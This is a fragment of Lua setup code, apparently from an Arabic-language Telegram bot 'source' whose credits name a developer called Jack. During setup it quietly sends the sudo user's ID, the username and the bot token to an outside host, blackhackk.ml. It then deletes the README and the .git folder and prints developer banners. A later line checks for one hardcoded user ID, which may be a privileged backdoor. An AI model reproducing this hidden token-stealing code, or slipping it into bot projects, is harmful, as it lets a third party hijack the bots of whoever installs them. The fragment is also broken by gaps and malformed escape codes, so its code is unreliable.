...
https.request("https://blackhackk.ml/sharatB¹.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
os.execute([[
rm -f ./README.md
rm -rf ./.git
chmod +x ./run
...
echo -e "\e[38;5;77m       •{ developer JACK : @B_6_6_B  }•\e[0m"

echo -e "\e[38;5;77m      BLACK ✾ @B_6_6_Be[0m"
echo -e "\e[38;5;77m       ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m       ✾ @B_6_6_Be[0m"
-------------------------------------------------------------------
]]..'\027[0;32m')
create_config() 
else
...
elseif msg.sender_user_id_ == 1460586714 then 
